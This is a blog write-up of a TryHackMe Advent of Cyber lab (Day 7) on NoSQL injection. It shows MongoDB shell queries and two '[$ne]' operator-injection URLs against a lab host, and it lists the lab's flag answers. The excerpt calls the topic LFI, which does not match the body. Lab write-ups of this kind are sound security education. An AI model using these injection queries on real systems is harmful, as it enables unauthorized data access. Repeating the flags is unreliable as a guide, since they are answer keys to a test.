---
title:  "TryHackMe: Advent of Cyber - Day 7 - Migration Without Security"
date:   2021-12-14 11:00:00 +1000
excerpt: Learning about Local File Inclusion (LFI) Vulnerabilities. 
---

This is a write up for the Day 7 - Migration Without Security challenge in the [**Advent of Cyber**](https://tryhackme.com/room/adventofcyber3) room on [TryHackMe](https://tryhackme.com). Some tasks may have been omitted as they do not require an answer.

***

### Interact with the MongoDB server to find the flag. What is the flag?

Listing the databases shows a db called "flagdb".

```
show databases
AoC3    0.000GB
admin   0.000GB
config  0.000GB
flagdb  0.000GB
local   0.000GB
```

We can then open the db with `use flagdb`.

`show collections` will list all available collections.

```
show collections
flagColl
```

`db.flagColl.find()` will reveal the flag.

<img src="{{ site.baseurl }}/assets/images/2021-12-14-advent-of-cyber-day-7/d7_1.jpg">

> Answer: **THM{8814a5e6662a9763f7df23ee59d944f9}**

### We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as admin and retrieve the flag?

We can intercept the login form and inject the following.

<img src="{{ site.baseurl }}/assets/images/2021-12-14-advent-of-cyber-day-7/d7_2.jpg">

Forwarding this on will allow us to log in to the system. This will reveal the flag on the `/flag` page.

<img src="{{ site.baseurl }}/assets/images/2021-12-14-advent-of-cyber-day-7/d7_3.jpg">

> Answer: **THM{b6b304f5d5834a4d089b570840b467a8}**

### Once you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag?

The search page is passing a GET parameter which exposes the `username` and `role` variables. We know the user we are looking for is not an admin so we can structure our query as follows.

```
http://10.10.52.100/search?username[$ne]=admin&role=guest
```

Scrolling down the page reveals the flag.

<img src="{{ site.baseurl }}/assets/images/2021-12-14-advent-of-cyber-day-7/d7_4.jpg">

> Answer: **THM{2ec099f2d602cc4968c5267970be1326}**

### Use the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record?

We can follow the same principle as the previous question. We know that the username is `mcskidy` and could have any role. We can check for role not equal to null to return all results.

```
http://10.10.52.100/search?username=mcskidy&role[$ne]=
```

<img src="{{ site.baseurl }}/assets/images/2021-12-14-advent-of-cyber-day-7/d7_5.jpg">

> Answer: **ID:6184f516ef6da50433f100f4:mcskidy:admin**

### Recap

In this task we learnt:
 * What is NoSQL?
 * Understanding NoSQL database
 * Understand Why NoSQL happens
 * Understand what NoSQL injection is
 * Using NoSQL Injection to bypass a login form
 